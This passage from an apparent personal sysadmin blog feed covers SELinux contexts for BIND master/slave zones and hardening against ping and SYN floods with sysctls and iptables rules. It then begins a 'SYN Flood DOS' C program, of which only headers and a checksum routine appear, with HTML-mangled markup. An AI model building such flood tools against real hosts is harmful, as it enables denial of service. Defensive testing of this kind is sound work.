</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="sr">/em&gt;master_192.168.10.112  etc]$ ls -Z named.conf</span>
</span><span class='line'><span class="sr"> -rw-r--r--. root named system_u:object_r:named_conf_t:s0 named.conf</span>
</span><span class='line'><span class="sr"> [root@_master_192.168.10.112  etc]$ ls -Z ../</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/*</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_conf_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">named</span><span class="o">.</span><span class="n">ca</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan10</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan192</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>Change the zone file's serial number(add) and reload the named.</h4>

<h3>Slave</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">slave_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">pwd</span>
</span><span class='line'> <span class="sr">/var/n</span><span class="n">amed</span><span class="o">/</span><span class="n">chroot</span><span class="o">/</span><span class="n">etc</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="sr">/em&gt;slave_192.168.10.111  etc]$ ls -Z named.conf</span>
</span><span class='line'><span class="sr"> -rw-r-----. root named system_u:object_r:named_conf_t:s0 named.conf</span>
</span><span class='line'><span class="sr"> [root@_slave_192.168.10.111  etc]$ ls -Z ../</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">slaves</span><span class="o">/</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="n">wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan10</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="o">.</span><span class="n">/wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan192</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>Now, check the zone file's serial number. The slave's zone files just changed. It's different from the former test.??</h4>

<h3>Look</h3>

<p><img src="/images/named_write_master_zones.jpg" alt="alt text" /><br /></p>

<h5>mine here.</h5>

<p><code>
[root@_master_192.168.10.112  named]$ getsebool -a |grep named
named_write_master_zones --&gt; off
[root@_slave_192.168.10.111  slaves]$ getsebool -a |grep named
named_write_master_zones --&gt; off
</code></p>

<h3>I do nothing, but enable the SELinux. And the name service just is still nice!</h3>

<h2>Make a change.</h2>

<p><code>
[root@_master_192.168.10.112  named]$ getsebool -a |grep named
named_write_master_zones --&gt; off
[root@_master_192.168.10.112  named]$ setsebool -P named_write_master_zones 1
[root@_master_192.168.10.112  named]$ getsebool -a |grep named               
named_write_master_zones --&gt; on
</code></p>

<h3>The M/S name servers still run well.</h3>

<h4>Futher more ......</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Art of Banning Ping Command and SYN Flood]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command/"/>
    <updated>2013-05-07T10:07:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command</id>
    <content type="html"><![CDATA[<h2>1. The theory of ping.</h2>

<p><img src="/images/ping.jpg" alt="alt text" /><br /></p>

<h2>2. kernel about</h2>

<h3>help doc</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>yum install -y kernel-doc.noarch
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<!-- more -->


<p>kernel-doc.noarch : Various documentation bits found in the kernel source</p>

<h3>/proc/sys/net/ipv4/</h3>

<h4>My test environment</h4>

<p><img src="/images/ping_art.jpg" alt="alt text" /><br /></p>

<h4>test prepare</h4>

<p>Show IP Address in prompt
<div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@&lt;code&gt;hostname -I&lt;/code&gt; \W]$ &quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
Show Internet IP Address in prompt
<div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@&lt;code&gt;curl ifconfig.me&lt;/code&gt; \W]$ &quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
or here, It's faster.
<div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@&lt;code&gt;curl icanhazip.com&lt;/code&gt; \W]$ &quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>2.1 icmp_echo_ignore_all</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.78/default - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">0</span> <span class="o">&gt;</span> <span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_all</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
<img src="/images/ping/icmp_echo_ignore_all_0.jpg" alt="alt text" /><br />
<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.78 - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_all</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
<img src="/images/ping/icmp_echo_ignore_all_1.jpg" alt="alt text" /><br /></p>

<h4>2.2 icmp_echo_ignore_broadcasts</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.78 - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">0</span> <span class="o">&gt;</span><span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_broadcasts</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.112/ping - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="o">/]</span><span class="vg">$ping</span> <span class="o">-</span><span class="n">b</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">255</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span><span class='line'><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">78</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">51</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">128</span> <span class="n">time</span><span class="o">=</span><span class="mi">0</span><span class="o">.</span><span class="mi">565</span> <span class="n">ms</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
if set <strong><em>1</em></strong>, there is no reply.<br /></p>

<h4>2.3 ip_default_ttl</h4>

<p>...</p>

<h4>2.4 ip_local_port_range</h4>

<p>...
......</p>

<h2>3. iptables</h2>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>iptables - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">DROP</span>
</span><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">REJECT</span>
</span><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">filter</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">S</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">REJECT</span> <span class="o">--</span><span class="n">reject</span><span class="o">-</span><span class="n">with</span> <span class="n">icmp</span><span class="o">-</span><span class="n">host</span><span class="o">-</span><span class="n">unreachable</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
They are different, try it!</p>

<h2>4. SYN Flood Test</h2>

<h3>Kernel about</h3>

<p><code>
cat /usr/share/doc/kernel-doc-2.6.32/Documentation/networking/ip-sysctl.txt
</code></p>

<h4>tcp_fin_timeout</h4>

<p>```
tcp_fin_timeout - INTEGER</p>

<pre><code>    Time to hold socket in state FIN-WAIT-2, if it was closed
    by our side. Peer can be broken and never close its side,
    or even died unexpectedly. Default value is 60sec.
    Usual value used in 2.2 was 180 seconds, you may restore
    it, but remember that if your machine is even underloaded WEB server,
    you risk to overflow memory with kilotons of dead sockets,
    FIN-WAIT-2 sockets are less dangerous than FIN-WAIT-1,
    because they eat maximum 1.5K of memory, but they tend
    to live longer. Cf. tcp_max_orphans.
</code></pre>

<p>```</p>

<h4>tcp_max_syn_backlog</h4>

<p>```
tcp_max_syn_backlog - INTEGER</p>

<pre><code>    Maximal number of remembered connection requests, which have not
    received an acknowledgment from connecting client.
    The minimal value is 128 for low memory machines, and it will
    increase in proportion to the memory of machine.
    If server suffers from overload, try increasing this number.
</code></pre>

<p>```</p>

<h4>tcp_syn_retries</h4>

<p>```
tcp_syn_retries - INTEGER</p>

<pre><code>    Number of times initial SYNs for an active TCP connection attempt
    will be retransmitted. Should not be higher than 255. Default value
    is 5, which corresponds to ~180seconds.
</code></pre>

<p>```</p>

<h4>tcp_syncookies</h4>

<p>```
tcp_syncookies - BOOLEAN</p>

<pre><code>    Only valid when the kernel was compiled with CONFIG_SYNCOOKIES
    Send out syncookies when the syn backlog queue of a socket
    overflows. This is to prevent against the common 'SYN flood attack'
    Default: FALSE

    Note, that syncookies is fallback facility.
    It MUST NOT be used to help highly loaded servers to stand
    against legal connection rate. If you see SYN flood warnings
    in your logs, but investigation shows that they occur
    because of overload with legal connections, you should tune
    another parameters until this warning disappear.
    See: tcp_max_syn_backlog, tcp_synack_retries, tcp_abort_on_overflow.

    syncookies seriously violate TCP protocol, do not allow
    to use TCP extensions, can result in serious degradation
    of some services (f.e. SMTP relaying), visible not by you,
    but your clients and relays, contacting you. While you see
    SYN flood warnings in logs not being really flooded, your server
    is seriously misconfigured.
</code></pre>

<p>```</p>

<h4>tcp_synack_retries</h4>

<p>```
tcp_synack_retries - INTEGER</p>

<pre><code>    Number of times SYNACKs for a passive TCP connection attempt will
    be retransmitted. Should not be higher than 255. Default value
    is 5, which corresponds to ~180seconds.
</code></pre>

<p>```</p>

<h3>SYN Flood Test DOS Attack with C Source Code (Linux)</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">&lt;pre&gt;&lt;code&gt;Syn Flood DOS with LINUX sockets</span>
</span><span class='line'><span class="cm">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">&lt;p&gt;*/</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span> <span class="c1">//memset&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span> <span class="c1">//for exit(0);&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">errno</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span> <span class="c1">//For errno - the error number&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netinet</span><span class="o">/</span><span class="n">tcp</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>   <span class="c1">//Provides declarations for tcp header&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netinet</span><span class="o">/</span><span class="n">ip</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>    <span class="c1">//Provides declarations for ip header&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">pseudo_header</span>    <span class="c1">//needed for checksum calculation</span>
</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">source_address</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dest_address</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">placeholder</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">protocol</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">tcp_length</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">tcphdr</span> <span class="n">tcp</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">csum</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="kt">int</span> <span class="n">nbytes</span><span class="p">)</span> <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">register</span> <span class="kt">long</span> <span class="n">sum</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">oddbyte</span><span class="p">;</span>
</span><span class='line'><span class="k">register</span> <span class="kt">short</span> <span class="n">answer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="n">nbytes</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">sum</span><span class="o">+=*</span><span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="n">nbytes</span><span class="o">-=</span><span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">nbytes</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">oddbyte</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="p">((</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">oddbyte</span><span class="p">)</span><span class="o">=*</span><span class="p">(</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">;</span>
</span><span class='line'>    <span class="n">sum</span><span class="o">+=</span><span class="n">oddbyte</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">sum</span> <span class="o">=</span> <span class="p">(</span><span class="n">sum</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">sum</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xffff</span><span class="p">);</span>
</span><span class='line'><span class="n">sum</span> <span class="o">=</span> <span class="n">sum</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="mi">16</span><span class="p">);</span>
</span><span class='line'><span class="n">answer</span><span class="o">=</span><span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="o">~</span><span class="n">sum</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span><span class="p">(</span><span class="n">answer</span><span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
